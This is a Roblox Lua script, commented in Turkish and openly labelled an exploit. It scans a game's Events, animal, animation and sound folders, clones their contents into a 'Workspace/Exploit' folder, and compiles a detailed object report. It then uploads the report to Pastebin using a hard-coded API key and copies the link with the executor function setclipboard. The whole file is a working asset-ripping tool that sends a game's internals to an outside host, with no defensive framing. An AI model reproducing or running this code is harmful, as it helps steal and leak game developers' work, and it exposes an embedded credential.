-- Hedef servisler
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Hedef klasörler
local targets = {
	Workspace:FindFirstChild("Events"),
	Workspace:FindFirstChild("RenderedMovingAnimals"),
	ReplicatedStorage:FindFirstChild("Animations") and ReplicatedStorage.Animations:FindFirstChild("Animals"),
	ReplicatedStorage:FindFirstChild("Animations") and ReplicatedStorage.Animations:FindFirstChild("Events"),
	ReplicatedStorage:FindFirstChild("Sounds") and ReplicatedStorage.Sounds:FindFirstChild("Animals"),
	ReplicatedStorage:FindFirstChild("Sounds") and ReplicatedStorage.Sounds:FindFirstChild("Events")
}

-- Workspace/Exploit klasörü kontrol
local exploitFolder = Workspace:FindFirstChild("Exploit")
if not exploitFolder then
	exploitFolder = Instance.new("Folder")
	exploitFolder.Name = "Exploit"
	exploitFolder.Parent = Workspace
	print("[EXPLOIT] Workspace/Exploit klasörü oluşturuldu")
else
	print("[EXPLOIT] Workspace/Exploit klasörü bulundu")
end

-- Fonksiyon: Objeyi derin kopyala
local function deepClone(obj, parent)
	local success, newObj = pcall(function()
		return obj:Clone()
	end)
	
	if success and newObj then
		pcall(function()
			newObj.Parent = parent
		end)
		return newObj
	else
		warn("[HATA] Kopyalanamadı: " .. tostring(obj))
		return nil
	end
end

-- Detaylı bilgi toplama fonksiyonu
local function getObjectInfo(obj, depth)
	depth = depth or 0
	local indent = string.rep("  ", depth)
	local info = ""
	
	-- Obje bilgisi
	info = info .. indent .. "├─ " .. obj.ClassName .. ' "' .. obj.Name .. '"\n'
	info = info .. indent .. "│  Path: " .. obj:GetFullName() .. "\n"
	
	-- Özellikler
	local props = {}
	pcall(function()
		if obj:IsA("BasePart") then
			table.insert(props, "Position: " .. tostring(obj.Position))
			table.insert(props, "Size: " .. tostring(obj.Size))
			table.insert(props, "Color: " .. tostring(obj.Color))
			table.insert(props, "Material: " .. tostring(obj.Material))
			table.insert(props, "Transparency: " .. tostring(obj.Transparency))
			table.insert(props, "Anchored: " .. tostring(obj.Anchored))
		elseif obj:IsA("Model") then
			table.insert(props, "PrimaryPart: " .. tostring(obj.PrimaryPart))
		elseif obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
			table.insert(props, "Source Length: " .. #obj.Source .. " chars")
			table.insert(props, "Disabled: " .. tostring(obj.Disabled))
		elseif obj:IsA("Sound") then
			table.insert(props, "SoundId: " .. obj.SoundId)
			table.insert(props, "Volume: " .. tostring(obj.Volume))
			table.insert(props, "Playing: " .. tostring(obj.Playing))
		elseif obj:IsA("Animation") then
			table.insert(props, "AnimationId: " .. obj.AnimationId)
		elseif obj:IsA("Humanoid") then
			table.insert(props, "Health: " .. tostring(obj.Health))
			table.insert(props, "MaxHealth: " .. tostring(obj.MaxHealth))
			table.insert(props, "WalkSpeed: " .. tostring(obj.WalkSpeed))
		end
	end)
	
	for _, prop in ipairs(props) do
		info = info .. indent .. "│  " .. prop .. "\n"
	end
	
	-- Alt objeler
	local children = obj:GetChildren()
	if #children > 0 then
		info = info .. indent .. "│  Children: " .. #children .. "\n"
		for i, child in ipairs(children) do
			info = info .. getObjectInfo(child, depth + 1)
		end
	end
	
	return info
end

-- Pastebin upload fonksiyonu
local function uploadToPastebin(code, title)
	local postData = "api_dev_key=1ddNdzegnNRL9UIrL_p9gbm4Q8er996l"
	postData = postData .. "&api_option=paste"
	postData = postData .. "&api_paste_code=" .. HttpService:UrlEncode(code)
	postData = postData .. "&api_paste_name=" .. HttpService:UrlEncode(title)
	postData = postData .. "&api_paste_format=lua"
	postData = postData .. "&api_paste_private=1"
	postData = postData .. "&api_paste_expire_date=1W"
	
	local url = "https://pastebin.com/api/api_post.php"
	
	local success, result = pcall(function()
		return HttpService:PostAsync(url, postData, Enum.HttpContentType.ApplicationUrlEncoded)
	end)
	
	if success and result:match("^https://") then
		return result
	else
		warn("[PASTEBIN HATA] " .. tostring(result))
		return nil
	end
end

print("[EXPLOIT] Tarama başladı...")

-- Tüm bilgileri topla
local fullReport = "=== ROBLOX EXPLOIT - OBJE RAPORU ===\n"
fullReport = fullReport .. "Tarih: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
fullReport = fullReport .. "Oyun: " .. game.Name .. "\n\n"

local totalObjects = 0

-- Tarama ve kopyalama
for _, target in pairs(targets) do
	if target then
		fullReport = fullReport .. "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
		fullReport = fullReport .. "HEDEF: " .. target:GetFullName() .. "\n"
		fullReport = fullReport .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
		
		local targetCopyFolder = Instance.new("Folder")
		targetCopyFolder.Name = target.Name .. "_Copy"
		targetCopyFolder.Parent = exploitFolder
		
		local count = 0
		for _, child in pairs(target:GetChildren()) do
			-- Bilgi topla
			fullReport = fullReport .. getObjectInfo(child, 0) .. "\n"
			
			-- Kopyala
			if deepClone(child, targetCopyFolder) then
				count = count + 1
			end
		end
		
		totalObjects = totalObjects + count
		fullReport = fullReport .. "\n[ÖZET] " .. count .. " obje kopyalandı\n"
		print(string.format("[✓] %s - %d obje kopyalandı", target.Name, count))
	end
end

fullReport = fullReport .. "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
fullReport = fullReport .. "TOPLAM: " .. totalObjects .. " obje Workspace/Exploit'e kopyalandı\n"
fullReport = fullReport .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

print("[EXPLOIT] Pastebin'e yükleniyor...")

-- Pastebin'e yükle
local pasteLink = uploadToPastebin(fullReport, "Roblox Exploit - Object Report " .. os.date("%Y%m%d"))

if pasteLink then
	print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print("[✓] PASTEBIN LİNKİ:")
	print(pasteLink)
	print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	
	-- Panoya kopyala
	if setclipboard then
		setclipboard(pasteLink)
		print("[✓] Link panoya kopyalandı!")
	end
else
	warn("[!] Pastebin yüklenemedi, rapor konsola yazdırılıyor:")
	print(fullReport)
end

print("[EXPLOIT] İşlem tamamlandı!")
